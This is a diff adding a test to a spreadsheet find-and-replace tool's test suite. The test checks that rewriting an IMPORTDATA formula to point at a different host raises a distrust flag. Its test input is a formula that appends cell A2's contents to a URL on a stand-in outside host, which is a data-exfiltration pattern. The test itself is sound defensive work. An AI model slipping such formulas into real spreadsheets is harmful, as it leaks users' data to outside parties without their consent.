@@ -101,6 +101,18 @@ describe('find_replace', () => {
     expect(wb.getCell(id, 7, 0).f).toMatch(/^IMPORTDATA/);
   });
 
+  it('holds back a formula that already reached outside the workbook once the replacement rewrites it', () => {
+    const { wb, id, env, run } = setup();
+    wb.setInput(id, 6, 0, '=IMPORTDATA("https://data.example.com/feed")');
+    // Left alone, it is not rewritten, and nothing is held back.
+    run('find_replace', { find: 'data.example.com', replace: 'other.example.net', in_formulas: false });
+    expect(env.distrust).not.toHaveBeenCalled();
+    // Rewritten, it fetches from another address, which the user has not allowed.
+    run('find_replace', { find: 'data.example.com/feed', replace: 'other.example.net/?q="&A2&"' });
+    expect(wb.getCell(id, 6, 0).f).toBe('IMPORTDATA("https://other.example.net/?q="&A2&"")');
+    expect(env.distrust).toHaveBeenCalled();
+  });
+
   it('says when nothing matches, and asks first when cells would change', () => {
     const { wb, env, run, json } = setup();
     expect(json(run('find_replace', { find: 'Kiwi', replace: 'x' }))).toMatchObject({ replaced: 0, note: 'No cells match.' });
